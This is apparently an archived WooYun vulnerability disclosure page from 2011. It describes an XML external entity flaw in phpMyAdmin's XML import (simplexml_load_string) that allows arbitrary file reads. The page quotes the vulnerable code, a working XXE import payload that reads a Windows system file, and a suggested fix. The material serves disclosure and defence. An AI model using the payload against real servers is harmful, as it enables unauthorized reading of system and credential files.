@@ -1,0 +1,207 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		PhpMyadmin任意文件读取漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		PhpMyadmin任意文件读取漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/80sec">80sec</a> 
+</li><li>提交时间：		2011-11-01 23:14</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2011-11-01：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2011-11-01：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">PhpMyadmin实现中错误的使用了simplexml_load_string函数用于xml解析，但是该函数中默认并没有处理好外部实体的安全性，导致用户可以借助xml文件读取和访问应用有权限访问的系统和网络资源</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">libraries/import/xml.php中<br />
+<br />
+</p><pre><code>unset($data);<br />
+<br />
+/**<br />
+ * Load the XML string<br />
+ *<br />
+ * The option LIBXML_COMPACT is specified because it can<br />
+ * result in increased performance without the need to<br />
+ * alter the code in any way. It&#039;s basically a freebee.<br />
+ */<br />
+$xml = simplexml_load_string($buffer, &quot;SimpleXMLElement&quot;, LIBXML_COMPACT);<br />
+unset($buffer);<br />
+<br />
+/**<br />
+ * The XML was malformed<br />
+ */<br />
+if ($xml === FALSE) {</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+可以使用系统中的import功能导入一个精心构造的xml文件<br />
+<br />
+<br />
+<br />
+</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;<br />
+&lt;!DOCTYPE wooyun [<br />
+  &lt;!ENTITY hi80sec SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;<br />
+]&gt;<br />
+&lt;!--<br />
+- phpMyAdmin XML Dump<br />
+- version 3.4.4<br />
+- http://www.phpmyadmin.net<br />
+-<br />
+- 主机: localhost<br />
+- 生成日期: 2011 年 11 月 01 日 14:56<br />
+- 服务器版本: 5.1.28<br />
+- PHP 版本: 5.2.6<br />
+--&gt;<br />
+<br />
+&lt;pma_xml_export version=&quot;1.0&quot; xmlns:pma=&quot;http://www.phpmyadmin.net/some_doc_url/&quot;&gt;<br />
+    &lt;!--<br />
+    - Structure schemas<br />
+    --&gt;<br />
+    &lt;pma:structure_schemas&gt;<br />
+        &lt;pma:database name=&quot;test&quot; collation=&quot;utf8_general_ci&quot; charset=&quot;utf8&quot;&gt;<br />
+            &lt;pma:table name=&quot;ts_ad&quot;&gt;<br />
+                &amp;hi80sec;<br />
+            &lt;/pma:table&gt;<br />
+        &lt;/pma:database&gt;<br />
+    &lt;/pma:structure_schemas&gt;<br />
+<br />
+    &lt;!--<br />
+    - 数据库: &#039;thinksns&#039;<br />
+    --&gt;<br />
+    &lt;database name=&quot;thinksns&quot;&gt;<br />
+        &lt;!-- 表 ts_ad --&gt;<br />
+    &lt;/database&gt;<br />
+&lt;/pma_xml_export&gt;</code></pre><p class='detail'><br />
+<br />
+来读写文件，系统错误信息会直接显示出文件内容 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/01231409a6f1892bbfee9f9be125cc37fc944f72.jpg" target="_blank"><img src="../images/01231409a6f1892bbfee9f9be125cc37fc944f72.jpg" alt="" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">换其他操作xml的方式，譬如xml_parse </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/80sec" title="80sec">80sec</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-03185" title="PhpMyadmin任意文件读取漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="3185";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
